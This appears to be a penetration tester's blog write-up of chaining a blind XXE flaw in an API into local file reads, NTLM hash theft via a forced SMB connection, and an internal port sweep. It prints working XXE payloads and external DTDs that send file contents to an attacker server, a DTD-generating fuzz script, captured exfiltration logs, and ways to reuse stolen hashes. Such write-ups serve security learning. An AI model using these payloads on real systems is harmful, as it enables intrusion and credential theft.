---
title: From XXE OoB to NTLM hash steal
published: true
---
I am writing this post because of a recent chain of cool vulnerabilities I got the opportuninty to exploit during a pentest.

For security reasons, I am not going to reveal the name of the company, although the bugs have been mitigated.
The vulnerability got to compromise an API through an [XXE OOB](https://portswigger.net/web-security/xxe/blind) vulnerability, from where I could read local files and also exfiltrate valuable data, such as domain name, username and NTLM hash. Finally, I *sorta* got access to a port scan just to look for internal ports.

## [](#header-2)Basic PoC

Let's take a look on the original request from the page, intercepted with burp:

```
POST blah/blah HTTP/1.1
Content-Type: application/json
User-Agent: PostmanRuntime/7.26.3
Accept: */*
Postman-Token: XX
Host: XXX.YYY.ZZ
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 3292

{
  "device": {
    "brand": "xx",
    "model": "xx",
    "os": "xx",
    "deviceType": 1,
    "deviceOs": 1,
    "userInformation": {
      "phoneNumber": "xxx",
      "owner": {
        "firstName": "peep ",
        "surName": null,
        "lastName": "test "
      },
      "drivers": [
        {
          "firstName": "peep ",
          "surName": null,
          "lastName": "test "
        }
      ],
    },
    "deviceAttributes": [
      {
        "key": "LANGUAGE_CODE",
        "value": "es"
      }
    ],
    "kyrosDeviceId": null
  },
  "incidentType": 2,
  "xmlDisplay": null,
  "xmlCase": "&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
              &lt;xmlCase version=&quot;1.0&quot;&gt;
              &lt;phone&gt;
              &lt;imei /&gt;
              &lt;/phone&gt;
              &lt;ResponseQuestions&gt;
              &lt;Questions&gt;
              &lt;Question&gt;
              &lt;Answers&gt;
              &lt;Answer&gt;
              &lt;AnswerId&gt;
              1&lt;/AnswerId&gt;
              &lt;TextAnswer&gt;
              &lt;Text&gt;
              &lt;LanguageCode&gt;
              1&lt;/LanguageCode&gt;
              &lt;Message&gt;
              Avería&lt;/Message&gt;
              &lt;/Text&gt;
              &lt;/TextAnswer&gt;
              &lt;Value&gt;
              100&lt;/Value&gt;
              &lt;/Answer&gt;
              &lt;/Answers&gt;
              &lt;Order&gt;
              1&lt;/Order&gt;
              &lt;QuestionId&gt;
              1&lt;/QuestionId&gt;
              &lt;TextQuestion&gt;
              &lt;Text&gt;
              &lt;LanguageCode&gt;
              1&lt;/LanguageCode&gt;
              &lt;Message&gt;
              ¿Qué ha sucedido?&lt;/Message&gt;
              &lt;/Text&gt;
              &lt;/TextQuestion&gt;
              &lt;/Question&gt;
              &lt;/Questions&gt;
              &lt;ReferenceId&gt;
              ITPOLICY_0001&lt;/ReferenceId&gt;
              &lt;/ResponseQuestions&gt;
              &lt;userdescription&gt;
              &lt;userdata&gt;
              &lt;language code=&quot;es&quot;&gt;
              &lt;field name=&quot;NIF&quot; attributeid=&quot;3&quot;&gt;
              xx&lt;/field&gt;
              &lt;field name=&quot;Tipo Vehiculo&quot; attributeid=&quot;4&quot;&gt;
              Moto&lt;/field&gt;
              &lt;field name=&quot;Marca&quot; attributeid=&quot;5&quot;&gt;
              Bmw &lt;/field&gt;
              &lt;field name=&quot;Modelo&quot; attributeid=&quot;6&quot;&gt;
              &lt;/field&gt;
              &lt;field name=&quot;Matrícula&quot; attributeid=&quot;7&quot;&gt;
              xx&lt;/field&gt;
              &lt;field name=&quot;Combustible&quot; attributeid=&quot;9&quot;&gt;
              &lt;/field&gt;
              &lt;/language&gt;
              &lt;/userdata&gt;
              &lt;/userdescription&gt;
              &lt;/xmlCase&gt;",
  "userProfile": null
```

First thing I thought when I saw the request was the XML parameters of the data section (in fact, it was the only thing I saw interesting). If we HTML-decode it we have the following:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xmlCase version="1.0">
	<phone>
		<imei />
	</phone>
	<ResponseQuestions>
		<Questions>
			<Question>
				<Answers>
					<Answer>
						<AnswerId>1</AnswerId>
						<TextAnswer>
							<Text>
								<LanguageCode>1</LanguageCode>
								<Message>Avería</Message>
							</Text>
						</TextAnswer>
						<Value>100</Value>
					</Answer>
				</Answers>
				<Order>1</Order>
				<QuestionId>1</QuestionId>
				<TextQuestion>
					<Text>
						<LanguageCode>1</LanguageCode>
						<Message>¿Qué ha sucedido?</Message>
					</Text>
				</TextQuestion>
			</Question>
		</Questions>
		<ReferenceId>ITPOLICY_0001</ReferenceId>
	</ResponseQuestions>
	<userdescription>
		<userdata>
			<language code="es">
				<field name="NIF" attributeid="3">xx</field>
				<field name="Tipo Vehiculo" attributeid="4">Moto</field>
				<field name="Marca" attributeid="5">Bmw </field>
				<field name="Modelo" attributeid="6"/>
				<field name="Matrícula" attributeid="7">xx</field>
				<field name="Combustible" attributeid="9"/>
			</language>
		</userdata>
	</userdescription>
</xmlCase>
```

I tried a basic Proof of concept with Burp Collaborator:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://abc.burpcollaborator.net">]><xmlCase version="1.0">
	<phone>
		<imei />
	</phone>
	<ResponseQuestions>
		<Questions>
			<Question>
				<Answers>
					<Answer>
						<AnswerId>1</AnswerId>
						<TextAnswer>
							<Text>
								<LanguageCode>1</LanguageCode>
								<Message>Avería</Message>
							</Text>
						</TextAnswer>
						<Value>100</Value>
					</Answer>
				</Answers>
				<Order>1</Order>
				<QuestionId>1</QuestionId>
				<TextQuestion>
					<Text>
						<LanguageCode>1</LanguageCode>
						<Message>¿Qué ha sucedido?</Message>
					</Text>
				</TextQuestion>
			</Question>
		</Questions>
		<ReferenceId>ITPOLICY_0001</ReferenceId>
	</ResponseQuestions>
	<userdescription>
		<userdata>
			<language code="es">
				<field name="NIF" attributeid="3">xx</field>
				<field name="Tipo Vehiculo" attributeid="4">Moto</field>
				<field name="Marca" attributeid="5">Bmw </field>
				<field name="Modelo" attributeid="6"/>
				<field name="Matrícula" attributeid="7">xx</field>
				<field name="Combustible" attributeid="9"/>
			</language>
		</userdata>
	</userdescription>
</xmlCase>
```

Looks like I got profit :D:

![](https://raw.githubusercontent.com/kikoas1995/kikoas1995.github.io/master/assets/2020-08-20-From-XXE-OOB-to-NTLM-thief/burp_collab.png)

However, the response from the server shows nothing to me, so it is time to do a *XXE out of band*. 

## [](#header-2)Let's retrieve files!

Now I need to adapt my payload to make it connect to a server where I have control. From there, I need to publish a malicious DTD in order to test LFI. The payload will be:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://xx.xx.xx.xx:80/evil.dtd"> %xxe;]
```

And the external DTD that will be invoked will be something like this:

```xml
<!ENTITY % file SYSTEM "file:///c:/Inetpub/wwwroot/Web.config">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % file "<!ENTITY fileContents '%start;%file;%end;'>">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://xx.xx.xx.xx:80/%file;'>">
%eval;
%exfiltrate;
```

Notice that I tried to retrieve a windows file. This is because in the header responses of the webapp, I saw it was running a IIS.
Okay, so now we just need to make the request while hosting a rogue web server in port 80 and...

```
xx.xx.xx.xx - - [20/Aug/2020 18:01:59] "GET /evil.dtd HTTP/1.1" 200 -
xx.xx.xx.xx - - [20/Aug/2020 18:01:59] code 404, message File not found
xx.xx.xx.xx - - [20/Aug/2020 18:01:59] "GET /%0D%0A%3Cconfiguration%3E%0D%0A%20%20%20%20%3Csystem.webServer%3E%0D%0A%20%20%20%20%20%20%20%20%3Csecurity%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cauthorization%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cadd%20accessType=%22Allow%22%20users=%22*%22%20/%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/authorization%3E%0D%0A%20%20%20%20%20%20%20%20%3C/security%3E%0D%0A%20%20%20%20%3C/system.webServer%3E%0D%0A%3C/configuration%3E HTTP/1.1" 404
```
Yay we got LFI! Now I needed to look for more interesting files. I thought about using intruder to fuzz for windows/IIS interesting files. However, I realized that the file name was in the DTD, not in the request... I though about some dirty solution then lol.

```python
#!/usr/bin/python
import sys

i=0
with open('file.txt') as fp:
    
    line = fp.readline().strip().lower()
    while line:
        f = open("evil" + str(i) + ".dtd", "a")
        f.write("<!ENTITY % file SYSTEM \"file:///" + line + "\">\n")
        f.write("<!ENTITY % start \"<![CDATA[\">\n")
        f.write("<!ENTITY % end \"]]>\">\n")
        f.write("<!ENTITY % file \"<!ENTITY fileContents '%start;%file;%end;'>\">\n")
        f.write("<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http:/xx.xx.xx.xx/%file;'>\">\n")
        f.write("%eval;\n")
        f.write("%exfiltrate;\n")
        f.close()
        line = fp.readline().strip().lower()
        i+=1
```

This script basically creates as many DTD files as lines in the wordlist I used to fuzz xD. Now it is only neccesary to run a Burp Intruder with evil0.dtd to evil[number of words in the wordlist, in my case 389].dtd.

After some bruteforce time (the API takes its time to response...), I only got a couple more files but nothing interesting... :(
How could I escalate the vulnerability now? After some time reading, I found this gem: https://techblog.mediaservice.net/2018/02/from-xml-external-entity-to-ntlm-domain-hashes/

### [](#header-3)XXE to steal NTLM hash

My external DTD will look like this:

```xml
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file://xx.xx.xx.xx/blah;'>">
%eval;
%exfiltrate;
```
What does it do? It basically forces the victim to connect to a SMB share exposed. This requires however a very bad network configuration that allows outbound traffic to unauthenticated rogue SMB exposed shares (spoiler: this is the case lol):
Now I just need to host a SMB capture server using metasploit:

![](https://raw.githubusercontent.com/kikoas1995/kikoas1995.github.io/master/assets/2020-08-20-From-XXE-OOB-to-NTLM-thief/msfsmb.png)

Bingo!

![](https://raw.githubusercontent.com/kikoas1995/kikoas1995.github.io/master/assets/2020-08-20-From-XXE-OOB-to-NTLM-thief/smb.png)

This is a win :D. In order to use this hash, we could use various methods:

1.  Crack it and find an exposed RDP service of the server. 
2.  Have access to the internal network and use SMBRelay+Responder to get a shell.
3.  Find an exposed Exchange server and PtH.
 
None of them were available to me unfortunately, but I learnt a lot :D.

## [](#header-2)Bonus track: Port scanner!

As an extra, I used the DTD to make a port `sweep` (poorly useful, as this service was slow af) with a XXE OoB time-based.

```xml
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://127.0.0.1:XX'>">
%eval;
%exfiltrate;
```

Where XX is the number of the port to test. If the port is open, it will typically take different time in the response than if it is closed. Although this worked in my case, it was not very useful because of two things:
1.  Requests took ~90s of response time, which is not good for bruteforcing open ports.
2.  I did not have access to any of these services.

I hope you liked it! :)

